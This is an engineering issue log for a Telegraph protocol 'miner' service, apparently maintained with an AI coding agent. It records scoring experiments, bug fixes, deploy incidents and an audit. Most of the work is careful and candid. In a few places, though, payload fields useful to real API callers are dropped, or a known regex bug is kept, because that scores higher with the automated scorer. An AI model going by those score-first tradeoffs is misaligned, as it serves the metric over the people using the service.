**Closed 2026-09-10.** The validator is back and it ran against the 26-intent manifest:
all **25 declared endpoints green, HTTP 200**, 239–632 ms, in the order the manifest
declares them. That is the first sandbox validation this miner has passed since the
thirteen-intent update, and it covers the four intents added today. Twenty-five
endpoints carry twenty-six intents because `/weather-forecast` serves both
WEATHER_FORECAST and WEATHER_CHECK.


CLAUDE.md rule 3 requires a clean run at `integrate.telegraphprotocol.com` before any
`updateMiner`. On 2026-08-31 ~22:20Z the endpoint accepts the request shape and then fails from
behind: `POST /api/validate` with `{}` returns `{"error":"yaml is required"}`, and the same call
with a real `{"yaml": ...}` body returns `{"error":"404 page not found"}` from the Next.js router.
Both a two-line manifest and our full 24,996-byte one reproduce it. This is the same console
breakage recorded on 2026-08-29, not a signal about our YAML.

**What was substituted, and why it is weaker.** The hosted manifest was parsed, then diffed
structurally against the manifest the node **accepted** for registration 389: no new top-level
keys, no new endpoint field names, `slug` / `base_url` / `id` unchanged, 13 intents all canonical
on-chain, every endpoint intent declared and every declared intent routed, and the `updateMiner`
call simulated read-only against the live diamond (`cast call`, passed). That establishes the
change is structurally identical to something already accepted. It does **not** establish that the
node's activation-time validator accepts the two endpoints new to this registration
(`/fact-check`, `/telegraph`), which have never been through activation.

Re-checked 2026-09-03 19:45Z: unchanged — `{}` returns `yaml is required`, the real manifest returns
`404 page not found`. Registration 402 has been `active` with all thirteen intents since 21:46Z on
2026-08-31, so activation itself accepted both endpoints; only the pre-send sandbox step was skipped.


### G61 · Whether epoch 298 counts toward the Track 1 judged record — `OPEN`

Track 1 closes 2026-08-31 23:59 UTC. Epoch 298 **starts** 23:02Z (inside the window) and its
scoring pass lands ~00:15Z on Sep 1 (outside it). Judging runs Sep 8–18 over "your average
Canonical Score", with no published statement of which epochs are included. The thirteen-intent
update was signed on the reading that an epoch beginning inside the window plausibly counts, and
that the downside if it does not is the gas plus a re-activation, not a lost position.


### G62 · SSL: the bench and live disagreed, resolved on 64 real rows — `CLOSED 2026-08-31 22:30Z: keep deployed`

**RESOLVED 22:30Z on 64 recovered receipts — the deployed shape is right and was not the cause.**
`shreshth006/Preflight` publishes 1,056 pre-G24 receipts with `question` + `ground_truth`, of which
**64 are SSL_VERIFICATION** — five times our 12-question frozen bench. Scored against the live
champion 631, clip32, engine-shaped calls, our real production answers:

```
DEPLOYED (method-first, 3a5b74a)   mean 0.469906   30/64 crossings
REVERT   (failure-first, pre-commit) mean 0.008053    0/64 crossings
rows the revert would win: 14/64
our deployed vs the recorded answers: mean 0.469906 vs 0.003624, 60/64 row-wins
```

The commit is **58x better** on real questions and crosses 30 rows where the old shape crosses
none. It is not the cause of the epoch-297 drop, and it was not reverted. G54's independent
reading — question-flavour rotation outside the bench — stands, now on five times the data.

**What this changes about method:** the 12-question frozen bench was too small to be trusted in
either direction, and the recovered receipts are the better instrument for SSL, IP and WALLET. The
rule from TELEGRAPH_FACTS still holds, but sharpened: prefer **real recorded questions** over both
scoring theory and small frozen benches. `scratchpad/ssl_ab.mjs` reproduces this A/B.

**Left open:** 34 of 64 rows still do not cross. That is real headroom, but finding it needs more
than one epoch's notice, and no untested change should ship into a scored epoch to chase it.


Commit `3a5b74a` (05:34Z, 2026-08-31) reordered the unreachable-host SSL answer to lead with the
method. It was measured against champion 631 over the 12-question frozen bench: failure-first
scored **0.010418** on the ten unreachable rows, method-first **0.697778** — a 67x improvement,
7/12 crossings. It deployed after epoch 296 was scored (05:03Z) and before epoch 297 (14:10Z).

**Live went the other way.** SSL had held 0.0093–0.0105 for eight epochs (#1 in 286, 288–291, 294,
296). Epoch 297 came in at **0.006226, #2** — a 33% drop, in the one window this change occupied.

This is the third time a bench-justified change has been contradicted live, and the pattern is
recorded in docs/TELEGRAPH_FACTS.md ("changes justified by a scoring theory ... have twice been
wrong"). Candidate explanations, none yet distinguished:

- The 12-question frozen bench is not representative of the questions epoch 297 actually routed.
  The split is conditional — reachable hosts keep the verdict form — so an epoch weighted toward
  reachable hosts would not see the improvement at all, and the drop would come from elsewhere.
- G54's reading, that the 297 losses were question-flavour rotation outside the bench, would also
  explain it, and was reached independently.

**Not reverted.** A blind revert 30 minutes before epoch 298 would gamble a #2 position against a
measured-better bench, and epoch 298 already carries six unverified changes (this, the G56 lean
payloads, the G53 ISO fix, the G40 papers shape, the G55 wallet reorder, and three new intents),
so the result would be unreadable either way. **Read epoch 298's SSL row first.** If SSL recovers
toward 0.0093 the drop was flavour rotation; if it stays near 0.006 this commit is the cause and
the revert is a one-line change to `ssl.ts`.

**Method rule this reinforces:** the frozen bench is a filter for obviously-bad changes, not
evidence a change wins. Only a scored epoch is that.


### G63 · Codex audit of 2026-08-31 22:30Z — four real findings, one by design

Five findings, each checked against the code rather than taken at face value.

**P0 · The submission claim in TASKS.md was asserted before it was verified — FIXED.** TB.9 was
written as "Submitted to submissions.telegraphprotocol.com" and ticked `[x]` while Claude had only
prepared the values; the operator had not yet said they had submitted. Corrected to record what is
actually known: the operator reported both tracks submitted at ~22:20Z, and Claude cannot verify it
because the submissions site needs a wallet-signed session. **A claim about an action Claude did not
take and cannot observe must name its source.**

**P1 · A deregistered registration passed monitoring — FIXED, and the first fix was wrong.**
`watch.mjs` marked only `activation_status === "rejected"` terminal, so a stale `REGISTRATION_ID`
reported a green tick forever. The first patch handled HTTP 404; measuring it showed the API
actually serves a **200 with `activation_status: "deregistered"`**, so that patch would not have
caught it. `deregistered` is now terminal. Verified both ways: id 389 fires
`!! TERMINAL rejection`, id 402 stays clean. This was live — `REGISTRATION_ID` stayed at 389 until
2026-09-03, and the fix fired on every scheduled run in between (G66).

**P1 · WEATHER_CHECK has no correctness check — OPEN, and the check itself is the problem.**
A `WEATHER_CHECK` case was added asserting the `hours=0` current-hour form, and the correctness
gate raised to 13/13. It failed **inside the gate** while passing in **four separate isolated
reproductions** (bare curl twice, a scripted single call, and a sequential replay of the preceding
gate calls) — all returning "A 1-hour hourly weather forecast". A single retry did not clear it.
The miner is correct; the check is not, and its cause was not isolated before epoch 298.
**Both changes were reverted** rather than leave preflight red on a false negative, which would
mask a genuine failure. Re-add with the flake understood, not with another retry.

**P1 · WEATHER_CHECK still defaults to a 24-hour forecast — DECLINED 2026-09-08, on evidence.** At
epoch 315 WEATHER_CHECK is #1 at 0.9993 on exactly this behaviour (and crossed at 0.929 in 309), so
mapping "current conditions" questions to a one-hour window would trade a measured crossing for an
unmeasured one on an endpoint that also serves WEATHER_FORECAST. The plan's critic flagged it as the
one proposed change that touches a shape already scoring well; it was dropped. Original record:
With no `hours` parameter a WEATHER_CHECK question gets a day-long range rather than current
conditions. The fix is a conditional: current-conditions wording plus no explicit window implies
`hours=0`. It was **not shipped**, because `/weather-forecast` also serves WEATHER_FORECAST where
we hold #3 at 95% of the leader, there are no recovered receipts for WEATHER_CHECK to measure
against, and an unmeasured change to a shared endpoint minutes before a scored epoch is the exact
mistake G62 and TELEGRAPH_FACTS both record. Ship it after epoch 298, measured.

**P2 · FACT_CHECK cannot confirm true claims — BY DESIGN, not changed.** There is deliberately no
`supported` verdict. The code comment records why: word overlap cannot separate an article *about*
a claim from one that *supports* it, and at a 0.75 threshold this rated **"vaccines cause autism"**
as supported, because `Vaccines_and_autism` contains every word of the claim it exists to refute.
`contradicted` survives only on explicit source markers ("myth", "debunked", "no evidence").
Adding a `supported` verdict to gain score would make the miner assert medical misinformation.
Declined. If FACT_CHECK scores poorly in epoch 298, the honest lever is retrieval quality.

**G57 addendum (2026-09-01 ~00:45Z):** registration 2882 was dethroned by reg 3064 (the salience
author reclaiming the slot) at 23:26:07Z — BEFORE epoch 298's wallet scoring ran at ~00:15Z, and
the sixth wallet-champion rotation in a day. Epoch 298's field-wide crossing was therefore most
likely judged by their scorer, not ours, meaning ours plausibly judged zero epochs of our own
intent; the fairness receipt above covers the window either way. Conflict surface retired.

### G64 · CertWatch retired; Track 3 moved to `telegraph-morse` — `CLOSED 2026-09-02`
`track3-certwatch/`, its workflow and CI job were deleted. It never made a paid call (no wallet was ever
funded) and never had a user, so nothing judged is lost. G13's Track 3 mitigation is now Morse
(<https://github.com/Harshyadav442277/telegraph-morse>), whose plan is designed around the real Track 3
rubric (45% real users + call volume) rather than around our own intent's eligibility. Its Vercel project
`certwatch` (app-five-blond-45.vercel.app) still exists and should be deleted by the operator.

### G65 · The public repo `Harshyadav442277/Telegraph` is a copy of PREFLIGHT, a rival miner — `OPEN, operator decision`
Found 2026-09-02 while checking repo names: its README and package.json are `preflight-ssl-verification`
(source public at github.com/shreshth006/Preflight), last pushed 2026-08-28. Judges browse profiles;
a competitor's code under our name with no attribution reads badly. Delete it, make it private, or add
an attributed study-fork note. Nothing in either of our repos depends on it.
Re-checked 2026-09-03: still public, last pushed 2026-08-28. Still the operator's call.

### G66 · The uptime tripwire was red for ~60 hours on a retired registration id — `CLOSED 2026-09-03: re-armed; nothing was wrong with the miner`
`REGISTRATION_ID` stayed at 389 after the 389 → 402 update of 2026-08-31 21:37Z: TB.6a was left on the
operator's list and never done. From 2026-09-01 the `check` job failed on every scheduled run, because
`watch.mjs` read `activation_status: deregistered` for 389 and exited on it — exactly the G63 P1
behaviour, working as designed on the wrong input. The alarm also worked: issue #5 collected eight
failure comments. Nobody read them, so for two and a half days the tripwire reported an outage that did
not exist and could not have distinguished a real one. The `scores` and `live-tests` jobs kept passing,
so epochs 302–305 were recorded on time and the miner itself was never in question.

Fixed 2026-09-03 19:46Z: variable set to 402, dispatch 33798427285 green on every job, the `resolve` job
closed #5 at 19:47:30Z. **Rule:** a registration change is not finished until the repo variable is
updated and one dispatched `uptime` run is green. Both belong in the signing runbook, not on a
human's list, and an open `uptime` issue must be read the same day it opens.

### G68 · `/headlines` only recognises thirteen topic words; any other subject gets generic top stories — `FIXED 2026-09-08, verified on the preview and in production`
`news.ts` derives the topic by matching the question against a fixed list (technology, business,
finance, science, health, sports, politics, entertainment, world, crypto, energy, climate, ai). A
subject outside it — "semiconductors", "artificial intelligence" — is dropped and the feed is queried
for "top stories"; and a question opening with "What" makes `extractRegion` return "What", so the feed
is searched for the word What. Verified live: `topic=semiconductors` → `topic: null`, MLB/NFL/ABC
headlines; "What are the top news headlines about artificial intelligence today?" → `region: "What"`.
The `topic` parameter the manifest declares as required is folded into the question and then subject
to the same list. "current technology headlines in Japan" works. Rank 1 in NEWS_HEADLINES is at
0.0045 in a near-zero field, so the scorer has not noticed; a real Track 3 caller gets confidently
off-topic headlines. Fix is small (use the `topic` parameter verbatim, else the noun phrase after
"about/on", and stop-word question openers in `extractRegion`) — but it is a production deploy inside
the Track 3 freeze, so it is the operator's call. Recorded, not shipped.

**Fixed 2026-09-08 (G79).** The "What" half had already gone on 2026-09-05. Now the declared `topic`
parameter is passed to `getHeadlines` on its own and used verbatim when it is a real subject (generic
words such as "news" or "top stories" are not), and failing that the noun phrase after
about/on/regarding/concerning is the subject, with its trailing time and place words removed. A proper
noun that belongs to the subject ("Shopify") is no longer read as a region. The thirteen-word list is
still matched first, so the recorded question shapes ("top 5 technology headlines from Japan as of
today") produce byte-identical answers — pinned by tests, and checked on the preview. Verified:
`topic=semiconductors` now returns semiconductor headlines (Reuters, Yahoo Finance) where it returned
MLB scores and a hospital shooting the same morning. NEWS_HEADLINES is #1 in seven of the last eight
epochs, so this is a fix for real callers; no rank claim is made.

### G69 · `/extract` truncates day-month-year dates and loses text after a colon — `FIXED 2026-09-08, verified on the preview and in production`
Two defects, both verified live. (1) `dates()` only knows "March 12, 2026": "12 March 2026" becomes
**"March 20"** (the day slot eats the first two digits of the year), so an invoice "dated 12 March
2026 … due 30 April 2026" is reported as "March 20, April 20". (2) `quotedPayload()` takes the text
after the first colon when there are no quotes, so a payload like "Contact sales@acme.com or call
415-555-0100. Docs: https://acme.com/pricing" is reduced to the URL and the email and phone are
reported as not found. The recorded scored questions carry their payload in quotes with US date
order, which is why CONTENT_EXTRACTION scores 1.0 while these shapes fail. Same freeze question as G68.

**Fixed 2026-09-08 (G79), and two more found on the way.** Day-month-year dates are read first and
masked before the month-day pattern runs, so "12 March 2026 … 30 April 2026" answers "March 12, 2026,
April 30, 2026" in the recorded ground truths' own form. The colon rule now applies only when the text
before the first colon is a short, unbroken instruction clause ("Extract the contact details from:");
a payload carrying its own colon is kept whole, so the acme example answers email, phone and URL.
Found while testing: a ten-digit number with a bare area code was truncated ("415-555-0100" →
"555-0100"), and "Extract the dates …" (plural) was not recognised as a date request. Both fixed. The
three recorded ground-truth strings are still reproduced exactly, byte for byte, on the preview.
Whether the fixture questions that score the whole field 0 in half the epochs (308, 309, 312, 315)
are these shapes cannot be known from outside — G24 — so no rank claim is made.

### G67 · The node's OpenAPI spec lists every one of our parameters on every one of our endpoints — `CLOSED 2026-09-03: the node does this to every multi-endpoint miner`

**Resolved the same hour.** Every multi-endpoint miner in the spec gets one unioned parameter list
across all its operations — miner 302 (14 endpoints), 900 (7), 152 (10), 34 (4) all show exactly one
distinct list; only miner 203 shows two. It is the node's rendering of shared `params` blocks, not
anything in our manifest, and there is nothing for us to change. Original observation kept below.
`GET /miner-dispatcher/openapi.json` (read 2026-09-03) exposes LiveCert as twelve operations under
`/v1/4433/…`, but each operation's `parameters` is the union of the manifest's shared `params` block:
`/v1/4433/ai-detect` advertises `domain` ("/ssl-check. Hostname to check…"), `days`, `hours`,
`forecast_days` and so on. Our manifest scopes each parameter with an `intents:` list and the engine
honours that scoping when it fills requests (measured across epochs 288–305), so scoring is not
affected. What is affected is a human or an MCP client reading the spec to build a direct call — they
see a misleading parameter list. **Unverified** whether this is the node flattening every miner's
shared `params` block the same way or something specific to ours; compare another multi-endpoint
miner's entry before concluding. Nothing changes before Sep 7 in any case — an `updateMiner` mints a
new registration id and would invalidate the submitted one.

### G70 · Redeploying the miner 404s every endpoint — `CLOSED 2026-09-04 20:40 UTC, fixed and verified live`
`vercel.json` rewrites every path to `/api/index`, and the platform used to hand the function the
**original** request line, so `req.url` read `/ssl-check` and `route()` worked. A deployment built
with **Vercel CLI 59.5.0** hands it the destination instead:

```
GET /ssl-check?query=test   ->   req.url = "/api/index?query=test"
```

so `ENDPOINTS` matched nothing and every declared endpoint fell through to the 404 branch. **This
is a total outage of a registered miner** — every routed request and every validator spot check,
and a spot check more than 20% below the leaderboard score is a Routing Revocation. It is triggered
by **redeploying**, not by any code change, so it would have fired on the next deploy whatever that
deploy contained. Any session that redeploys this miner without reading this will reproduce it.

Sequence, for the record: promoted at ~20:2xZ, `/ssl-check` on `miner-wine.vercel.app` answered
`not_found`, rolled back to `miner-th3yytd1u` within a few minutes, production verified serving
again, then diagnosed on a preview that echoed the path it was given. **Morse (Track 3) was not
affected**: its last routed call was 19:45:11Z, before the window, and every `livecert` row in its
ledger is `ok`.

Fix: the rewrite passes the original path as `__path=/$1`, and `route()` prefers it when it is
present and starts with `/`, falling back to `req.url` so `npm start` and every existing test are
unchanged. `__path` is deleted from the query before any handler reads it, so it can never be seen
as user input, and a value that is not a path is ignored rather than trusted. Five unit tests pin
the shape. Verified on a preview across all twelve endpoints, then in production; preflight 7/7,
`watch.mjs` `endpoint=ok 462ms activation=active`.

**Note for whoever deploys next:** a `vercel rollback` pins production, and a later `vercel --prod`
does **not** move the alias on its own — it needs `vercel promote <url>`. That cost one confusing
verification round here.


### G71 · TELEGRAPH_KNOWLEDGE's routed questions are 97% not about Telegraph — `OPEN, deliberately not chased`
Of the **919 distinct TELEGRAPH_KNOWLEDGE questions** in the explorer's routed feed
(`explorer.telegraphprotocol.com/api/daemon/api/questions`, 18,754 rows paged 2026-09-04), only
**24 (2.6%)** mention Telegraph, a miner, an intent, an epoch, the explorer or MACHINA. The rest are
open-domain: *"Is the OpenAI board independent from the company?"*, *"Will Meta fire the
executive?"*, *"What is the Model Context Protocol, and who created it?"*. The other miner in the
field, `telegraph-chatbot`, is an LLM chat-completions endpoint and answers them.

The **canonical intent description agrees with our design**, not with the routing: it scopes the
intent to Telegraph, its products and ecosystem, and says to use it "rather than routing to general
CHAT_COMPLETION or WEB_SEARCH". So the Daemon's router is over-matching, and the scoring fixtures
are evidently a different, much more Telegraph-heavy set — which is why we scored a clean **1.0** in
epochs 298, 299, 304, 305 and 306 and ~1e-11 in 300, 302, 307 and 308.

**Not chased.** Answering open-domain questions needs an LLM or a general retriever this miner does
not have, and inventing answers is the failure this project refuses everywhere. What *was* fixed is
the half we own — see the fact-table commit; coverage of questions inside the canonical description
went 13/34 to 34/34.

**Widened again 2026-09-08 (G79), still not chasing the open-domain 97%.** Seven entries were added
from the facts verified in docs/TELEGRAPH_FACTS.md § "Consumer surfaces": direct calls and the
dispatcher (and "subnet" as the node's word for a miner), the MCP server and its tool names, the
WebSocket and escrow, x402 payment and signal verification, the reference applications and the three
integration paths, validators and nodes, and where the documentation lives. Each fires only when the
question also names something of Telegraph's, so "Will the website go down tomorrow?" and "Where can I
read the docs for React?" stay `not_covered`. The independent critic of the day's plan warned that a
new entry could steal a question an existing entry already answers — and that TELEGRAPH_KNOWLEDGE
scored 1.0 in five epochs off the existing table — so the committed table and the new one were run
over 96 questions before shipping: **0 moved off a specific existing entry, 13 moved from the generic
catch-all to a subject-specific answer, 1 refusal became an answer, 22 off-topic stayed refused.**
Those 96 routes are now a test. The judgement call, stated plainly: taking a question from the
generic "Telegraph is a decentralised network…" paragraph is accepted, because that text is unlikely
to be what crosses on a subject-specific fixture; taking one from a specific entry is not. The score
has been ~1e-11 in five of the last eight epochs; whether any fixture question is among the widened
set is unknowable from outside.


### G72 · WALLET_BALANCE_CHECK has no measurable defect, and the live band is noise — `MEASURED 2026-09-04`
We sit **#7 of 10 at ratio 0.680** and the obvious reading is that our answer is worse. It is not.
Scored against the **current** champion (reg 3022, `wlz_0001.wasm`, activated 2026-09-01 and never
analysed before this) over the 16 distinct real recorded questions in the Preflight receipts, our
live production answers beat **the best answer anyone recorded on 13 of 16**, mean 4.375e-1 against
6.25e-2 — seven times better.

The live field is 2.42e-13 down to 1.65e-13: the whole of it inside a factor of 1.5, at 1e-13. That
is the sub-cliff noise band, not an ordering by quality. **No change was made**, because there is
nothing measurable to fix and a speculative one is exactly the pattern G62 records being wrong.


### G73 · The champion WASMs reproduce recorded scores exactly, so the oracle is validated — `MEASURED 2026-09-04`
G24 removed `question`, `ground_truth` and `converted_answer` from the feed and noted the champion
WASM "can no longer be validated against reported scores". It can, from the Preflight receipts,
which retained all three. Scoring `(question, ground_truth, converted_answer)` under the current
champion reproduces the **recorded score exactly**: SSL **32 of 34** rows, IP 6 of 15 — and every
miss in both is a row from an epoch before that intent's champion rotated. Our own two recorded IP
rows reproduce to eight digits (0.99204141 vs 0.9920414, 0.99209267 vs 0.99209267).

What this buys: given a candidate **converted** answer, its score can be computed exactly rather
than approximated. The one remaining unknown is the converter — what prose the node writes from a
given payload — and the receipts pin that too for the rows they cover. Anything measured this way
is worth more than a `clip32` payload proxy; see `scratchpad/validate.mjs` for the reproduction.

### G74 · Two regexes still carried backspace bytes where `\b` was meant, and one of them was a deploy gate — `FIXED 2026-09-05`

The 2026-08-26 Codex review found natural-language regexes built from strings, so `\s` `\d` `\b`
had been eaten, and fixed it by moving to regex **literals**. That fix is incomplete in a way
nothing could show: a raw 0x08 is legal inside a literal, and it renders as nothing in every
terminal, editor diff and `toString()`. Two survived, found by scanning every tracked file for the
byte rather than by reading code.

**`tools/replay-corpus.mjs`, the STORM probe.** `/\b(?:over|within|during|across)\s+...` and
`/\bright now\b/` required a literal backspace, so the span and point branches never fired and the
probe reported **31/31 while checking nothing**. Underneath, both branches read `time_mode` — a
field declared in `miner.yaml` and emitted by **no endpoint**, so even a live branch would have
compared `undefined` to a string forever. The rewritten probe reads the prose, and a self-test
proves it can fail on each case it claims to catch.

**`miner/src/storm.ts`, the wind-component test.** `/\b(?:10|100)?u\b|u-component/i` could only
ever match the literal string "u-component", so bench row 0 — a real scored question naming ERA5's
variable '10u' — has never received the sentence explaining the component. **Restoring the
boundaries was measured and rejected**: −30.1% on that row and −61.1% on row 10 under champion 453,
because the scored clip is 32 words and an added sentence displaces answer that scores. Row 10 also
shows a bare `\bu\b` matching by accident. The code now says what it does; behaviour is unchanged.

**The lesson worth keeping:** a check that cannot fail is worse than no check, and this class of
corruption is invisible to review. `node -e` over `git ls-files` counting 0x08 is cheap; run it
after any session that edited a regex through a shell heredoc or `sed`.

### G75 · STORM_ALERT now serves the lean payload — `SHIPPED TO THE REPO 2026-09-05, unverified live`

G56 projected SSL, weather and wallet to `{verdict, confidence, reason}` and recorded that "IP,
STORM, NEWS, CONTENT, AI_TEXT, TRANSLATION and ACADEMIC are untouched" — those three were leaned
because they had evidence that day, not because the others had been measured and cleared. Weather
crossed its cliff at epoch 298 and SSL at 309. STORM kept seventeen metadata fields around its
prose and sits at #3, ratio 0.069, behind a `txlens` whose entire production payload is one
`answer` string.

Measured under the live champion 453 on production payloads (`bench/payload_shape.mjs`): flat32
0.008933 → 0.011762 (+32%), desc32 0.008613 → 0.010864 (+26%), lean winning **11 of 12** rows,
reason32 identical to six decimals because the prose does not move.

**What this is not.** flat32 is a proxy for a converter that is still not runnable offline (G24),
twelve rows are a filter and not a verdict (G62), and +32% of payload surface is not a cliff
crossing: it projects to roughly 0.014 against txlens's 0.1538. The honest claim is that it should
pass `skywire-storm-alert` at 0.0115 for #2, not that it wins the intent. Only a scored epoch


**Update 2026-09-05 ~08:30Z — deployed.** Organisers encouraged continued work on the miner, so the
2026-09-03 freeze no longer applies. `miner-1usikt6vq` is production: preflight **7/7**, watch
`endpoint=ok 629ms activation=active`, registration 402 active, manifest hash unchanged so no
`updateMiner`, and all twelve endpoints answer (no G70 recurrence). IP_GEOLOCATION was measured the
same way and shipped with it: flat32 0.525445 -> 0.666003, **+26.8%**, 17 of 21 rows, champion 630.
Latitude and longitude are now served nowhere — they were fields, never prose — which is a real loss
to a direct API consumer and no loss to the scorer. **Epoch 310 (~14:45Z) is the acceptance test.**


### G76 · STORM_ALERT answered point questions at the wrong hour, by exactly the location's UTC offset — `FIXED 2026-09-06, verified live`

`storm.ts` asked Open-Meteo for `timezone=auto`. Under that flag the API returns the **location's**
wall-clock strings with no offset suffix (`2026-09-06T00:00`, `utc_offset_seconds` 19800 for
Chennai), and every parse in the file read them as `` `${t}Z` ``. The comment above the trim said
"Open-Meteo returns whole days from midnight UTC", which is true only *without* `timezone=auto`.
`forecast.ts` had asked for `timezone=UTC` all along, so WEATHER_FORECAST and WEATHER_CHECK were
never affected — this was STORM only.

The misparse shifted `from`, the index treated as "now", by the location's UTC offset. Measured
2026-09-06 against "in 12 hours": **Tokyo answered now+3.4h, Chennai now+6.9h, Honolulu now+22.4h.**
Window questions were shifted the same way — Honolulu's "next 48 hours" covered now+10.4h to
now+51.4h and returned 42 rows instead of 48 — though the reported peak coincided in all four
places checked, so window damage was latent rather than active.

**Why every gate was green through it.** `storm.test.ts` parsed `valid_at` with the same
`` `${t}Z` ``, so the two errors cancelled and the drift assertion read ~0.4h no matter how wrong
the hour actually was. **No assertion on `valid_at` alone can catch this**, in either direction.
It only went red when the shift also moved the window index and clamped it, which is time-of-day
dependent — that is the intermittent `checkStorm (live)` failure that broke **4 of the last 10**
uptime runs, and both CI drifts reproduce exactly from the model (4.9h at 19:04Z, 2.7h at 21:18Z).
It had been read as upstream flakiness.

Fix: `timezone=UTC`, matching `forecast.ts`. The new test pins the reported gust against an
independently fetched UTC series at a large offset (Tokyo) and **fails on `timezone=auto`** —
confirmed by reverting the one line and watching the gust assertion fire while the drift assertion
still passed. Verified live after promotion, prose figures against UTC truth: Tokyo gust 43.2,
Honolulu 33.8, Chennai 29.5, all matching the true now+12h row and all differing from what the old
code served (42.5 / 38.5 / 27.4). Note the payload is lean (G75) so `valid_at` is not served at
all — the prose is the whole product here, and the prose was wrong.

### G77 · `/fact-check` preferred a disambiguated Wikipedia article over the canonical one — `FIXED 2026-09-06, verified live; the two stemming cases FIXED 2026-09-08`

"Is it true that the Eiffel Tower is located in Paris?" — the worked example in `miner.yaml`'s own
description — resolved to **`Eiffel_Tower_(Paris,_Tennessee)`**, a 60-foot replica, and answered
`unverified` while quoting it. The title scorer split the raw title on whitespace without stripping
punctuation, so `(paris,` and `tennessee)` could never match a claim word; the parenthetical
contributed nothing to `titleHit` while its longer snippet still fed `hit`. Scores were
`Eiffel Tower` 7 vs `Eiffel Tower (Paris, Tennessee)` 8 — the replica won by one point, purely
because its snippet contains the word "located".

Fix: score the title with the parenthetical removed, and penalise a disambiguated title unless the
claim names **every** word inside the parentheses. Requiring only one was the subtle part — the
claim does say "Paris", which is half of "Paris, Tennessee", so an `any` test waives the penalty
and keeps the bug. Live now returns `en.wikipedia.org/wiki/Eiffel_Tower`.

The `unverified` verdict itself is by design and was not touched: this endpoint never asserts a
claim true on a topical match. Two weaknesses in the same scorer were measured and deliberately
left alone, because both need stemming rather than a scoring tweak: "humans only use 10% of their
brains" still picks *Flight of the Navigator* over *Ten-percent-of-the-brain myth* (both score 4,
first-seen wins), which is the exact case the code comment claims to have fixed; and "water boils
at 100 degrees Celsius" picks *Anders Celsius*, a person.

**Both fixed 2026-09-08 (G79).** The article-selection score now compares stemmed tokens (plural,
-ing, -ed stripped), turns number words into digits and "%" into "percent", and keeps numeric tokens
whatever their length — so "brains" meets "brain", "boils" meets "Boiling point", and "10%" meets
"Ten-percent". Live: the brain claim now resolves to `Ten-percent-of-the-brain_myth` (and, because that
article says "myth", the verdict is `contradicted`), the boiling claim no longer picks the astronomer,
and the Eiffel Tower case is unchanged. `judge()` keeps its own exact tokens, so the no-`supported`
safety property is untouched and still tested.

### G78 · `preflight.mjs` scores Vercel's login page when pointed at a preview — `FIXED 2026-09-08: it refuses instead; grading a preview directly still needs a project-settings change`

Preview deployments are behind Vercel deployment protection: an anonymous request 302s to an auth
page, so `preflight.mjs https://<preview>` reported **2/7 with "180 bad, 0 clean"** while grading
Vercel's HTML rather than the miner. The same preview answered correctly through
`npx vercel curl`, which authenticates. CLAUDE.md already tells you to use `vercel curl` for a
preview probe, but `preflight.mjs` — the gate that is supposed to run *before* promoting — uses
plain `fetch` and cannot be pointed at a protected URL at all.

This is the G74 shape again: **a gate reporting confidently on nothing.** Its output is not merely
unavailable for previews, it is actively misleading — a red run that looks like a broken build.
Until it is fixed, "preview first, always" cannot be gated, and 2026-09-06 shipped by promoting to
production and running the gates there, with a rollback to `miner-9me29eapa` held ready. That is
backwards and only acceptable because production is unprotected and rollback is one command.
Fix is either an auth token in the fetch, or `vercel curl` as the transport.

**Fixed 2026-09-08 (G79) — the lying half.** Before any gate runs, `preflight.mjs` now fetches
`/health` with redirects disabled and requires the miner's own JSON (`service: "livecert"`). Anything
else — a 302 to `vercel.com/sso-api`, HTML, a timeout — exits 2 with a message naming what answered
and what to do instead. Proven against the protected preview `miner-1e6w5zrsi`: exit 2, no gate run,
while `npx vercel curl` on the same preview returned the health JSON. A gate can no longer report
"2/7" on Vercel's login page. **Still open — the grading half.** Grading a protected preview directly
needs either Vercel's "Protection Bypass for Automation" secret or Vercel Authentication turned off
for preview deployments, both of which are project settings only the operator can change; until then
the procedure is preview → `vercel curl` probes → promote → gates against production with a rollback
held, which is what today's deploy did.

### G79 · The 2026-09-08 deploy: six correctness fixes shipped during Winner Selection, and livecert is third by normalized sum, not first — `RECORDED 2026-09-08`

**Standing, measured today rather than remembered.** Over all 341 miners scored at epoch 315 (from
`/api/miners`, each intent normalized by its epoch leader): chainsight-oracle 11.23 (14 intents, avg
0.80), txlens 10.74 (14, 0.77), **livecert 10.30 (13, 0.79)**, preflight 7.89 (10, 0.79). By average
among miners with three or more intents we are sixth, behind single-purpose miners at 0.93–1.00 and
one place behind chainsight. MEMORY.md's "first on the network" lines for epochs 298 and 308 were
true when computed and cannot be re-verified from `score-history.jsonl`, which keeps only our scores
and each leader. The judged aggregation is an average whose formula is unpublished (G59, G61); both
readings are in `track1-miner/docs/RANK_REPORT_2026-09-08.md`, which is the report on why rank 1 in
every intent is not reachable and what was done.

**What shipped, all correctness or coverage, none a wording change on a scored shape:** G69 (dates,
colon, plus bare area codes and plural "dates"), G68 (headline subject), G77 (stemmed article choice),
G71 (seven Telegraph-knowledge entries with a context guard and 96 pinned routes), G78 (preflight
refuses a protected preview). 208 unit tests, from 199. Manifest untouched: registration 402 stays
`active` with hash `7538…7640`, no `updateMiner`.

**How it was verified, in order.** Preview `miner-ghztjnbfp` probed through `npx vercel curl` on all
twelve endpoints plus each fixed shape; the two recorded scored shapes (`/extract` contact,
`/headlines` technology-from-Japan) byte-identical. Production `miner-o50wpiyof` deployed with
`--prod`; the alias moved on its own (`promote` answered 409 "already the current production
deployment"); `/health` on the alias reported a fresh uptime and `/ssl-check` and `/extract` answered,
so no G70 recurrence. `preflight.mjs` against production: **6/7 on the first run** — the one miss was
`verify-deploy`'s `/papers` bare-topic probe returning zero papers right after the live suite had
hammered OpenAlex (the G34/G43 pattern on a route today's changes do not touch); **re-run alone, as
the gate's own header instructs, ALL CHECKS PASSED** with five papers and median 341 ms. `watch.mjs
--once` against registration 402 and the alias: `endpoint=ok 358ms (verdict=valid) activation=active`.
Rollback target held throughout: `miner-3d806mm3e`, never needed. Two further production builds
followed the same morning, each preview-probed and alias-checked the same way: `miner-m3jzb6437`
(G80, the MyMemory quota guard), `miner-e08uy72lg` (G81, the OpenAlex retry and opt-in polite
pool) and `miner-y1118mdz5` (the retry wait shortened to 1.5 s), which is where the day ends.

**What the independent critic changed before anything shipped.** The plan was reviewed by a separate
session before execution. It dropped the WEATHER_CHECK current-conditions change (G63-P1) because the
intent is #1 at 0.9993 on the current behaviour; dropped a proposed archive move of the dated reports
as link churn during judging; dropped a proposal to log question values in production as a privacy
change that is the operator's; required the Telegraph-knowledge entries to be pinned against route
